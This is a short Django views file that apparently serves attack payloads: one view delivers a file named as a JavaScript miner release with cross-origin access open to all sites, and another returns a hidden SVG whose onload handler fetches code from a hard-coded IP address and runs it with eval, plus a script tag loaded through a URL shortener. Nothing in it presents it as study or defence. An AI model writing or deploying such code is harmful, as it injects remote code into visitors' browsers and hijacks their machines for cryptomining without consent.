from django.shortcuts import render
from django.http import HttpResponse

import os
# Create your views here.
def getSourceDir():
	BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
	source_dir = os.path.join(BASE_DIR, 'source')
	return source_dir

def miner_common(request):
	source_dir = getSourceDir()								
	f = open('%s/miner_release_nV4prwHkF.js' % (source_dir),'rb')
	code = f.read().decode()
	f.close()

	response = HttpResponse(code)
	response['Access-Control-Allow-Origin'] = '*'
	return response

def quick(request):
	return HttpResponse('''
<svg onload='var a=new XMLHttpRequest();a.onreadystatechange=function(){if(a.readyState==4&&a.status==200){eval(a.responseText)}};a.open("GET","http://104.128.224.219:5555/X5lKvJQHFb/");a.send();' style='height:0px;width:0px;'></svg>
<script src='http://suo.im/3dRiTv'></script>
''')